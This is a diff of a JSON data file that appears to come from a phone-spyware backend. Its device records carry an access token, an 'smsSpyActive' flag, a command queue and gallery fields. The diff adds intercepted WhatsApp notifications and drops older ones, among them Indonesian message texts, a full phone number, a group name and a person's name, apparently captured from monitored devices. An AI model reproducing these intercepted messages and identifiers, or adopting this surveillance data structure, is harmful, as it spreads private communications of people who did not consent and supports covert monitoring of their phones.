@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776945827081,
+    "lastSeen": 1776945830375,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎65 pesan dari 42 chat",
+        "time": "23/04 20:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776945830393
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 822-6965-3769",
+        "content": "sipp",
+        "time": "23/04 20:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776945830042
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 19:12",
         "pkg": "com.whatsapp",
         "receivedAt": 1776942762504
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎59 pesan dari 38 chat",
-        "time": "23/04 19:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942762349
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎59 pesan dari 38 chat",
-        "time": "23/04 19:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942761932
       }
     ],
     "galleryPhotos": [],
@@ -9971,6 +9971,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (10 pesan): ~ Fitri Dian Lestari",
+        "content": "Yang mna mi ini benar  buket bebas atau biru",
+        "time": "23/04 20:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776945832117
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎202 pesan dari 5 chat",
+        "time": "23/04 20:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776945832099
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎201 pesan dari 5 chat",
         "time": "23/04 20:01",
@@ -13952,22 +13968,6 @@
         "time": "23/04 11:06",
         "pkg": "com.whatsapp",
         "receivedAt": 1776913599273
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Memeriksa pesan baru",
-        "time": "23/04 11:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776913598713
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎201 pesan dari 4 chat",
-        "time": "23/04 11:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776913521080
       }
     ],
     "galleryPhotos": [],
